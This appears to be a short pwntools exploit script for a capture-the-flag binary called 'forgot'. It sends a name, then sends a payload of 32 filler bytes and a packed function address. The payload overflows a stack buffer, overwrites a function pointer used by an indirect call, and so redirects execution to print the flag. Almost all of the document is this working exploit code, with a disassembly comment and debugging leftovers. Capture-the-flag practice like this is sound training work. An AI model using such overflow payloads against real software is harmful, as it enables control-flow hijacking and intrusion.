#!/usr/bin/python 
from pwn import *
'''
    0x8048a58: sub    DWORD PTR [esp+0x78],0x1
 => 0x8048a5d: mov    eax,DWORD PTR [esp+0x78]
    0x8048a61: mov    eax,DWORD PTR [esp+eax*4+0x30]
    0x8048a65: call   eax
'''
# context.log_level = 'debug'
p = process('./forgot')

call = 0x080486CC
eax = 0xfffffffc

p.recvuntil('> ')
p.sendline('Daddy TaQini')

p.recvuntil('> ')
# gdb.attach(p, 'b *0x0x8048a58') # scanf

# payload = "A"*16 + p32(call) + "A"*84 + p32(eax+1)
payload = "A" * 32 + p32(call) # zz 
p.sendline(payload)

flag = p.recvline()
log.success('flag: ' + flag)

# p.interactive()
